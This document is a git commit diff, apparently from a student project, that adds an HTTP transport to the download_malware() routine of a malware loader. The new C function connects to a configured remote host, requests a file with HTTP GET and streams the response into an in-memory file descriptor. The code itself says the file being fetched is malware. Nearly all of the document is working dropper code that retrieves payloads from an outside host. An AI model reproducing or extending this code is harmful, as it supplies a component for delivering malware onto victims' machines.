121f9270bdd2c9d974a936d71c5399733831eecd
alagroy- <alagroy-@student.42.fr>
2022-10-20 08:56:25 -0400

    adding HTTP Download support

--- srcs/download.c
+++ srcs/download.c
@@ -26,6 +26,34 @@ static int      download_file_over_tcp(t_config config, int memfd)
     return (EXIT_SUCCESS);
 }
 
+static int      download_file_over_http(t_config config, int memfd)
+{
+    int     sockfd;
+    char    buf[1024];
+    int     ret;
+
+    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+        perror(RED"[-] socket: "WHITE);
+        return (-1);
+    }
+    if ((connect(sockfd, config.host_infos->ai_addr, sizeof(t_sockaddr))) == -1) {
+        perror(RED"[-] connect: "WHITE);
+        return (-1);
+    }
+    ret = snprintf(buf, 1024, "GET %s HTTP/1.0\r\n\r\n", config.remote_file_name);
+    if ((send(sockfd, buf, ret, 0)) == -1) {
+        perror(RED"[-] send: "WHITE);
+        return (-1);
+    }
+
+    while ((ret = recv(sockfd, buf, sizeof(buf), 0)) > 0) {
+        write(memfd, buf, ret);
+    }
+
+    close(sockfd);
+    return (EXIT_SUCCESS);
+}
+
 /**
  * @brief Downloads the malware through the host specified in config
  * 
@@ -40,7 +68,7 @@ int             download_malware(t_config config)
         return (memfd);
     if (config.protocol == PROTO_TCP)
         return download_file_over_tcp(config, memfd);
-    // else if (config.protocol == PROTO_HTTP)
-    //     return (download_file_over_http(config, memfd));
+    else if (config.protocol == PROTO_HTTP)
+        return (download_file_over_http(config, memfd));
     return (-1);
 }
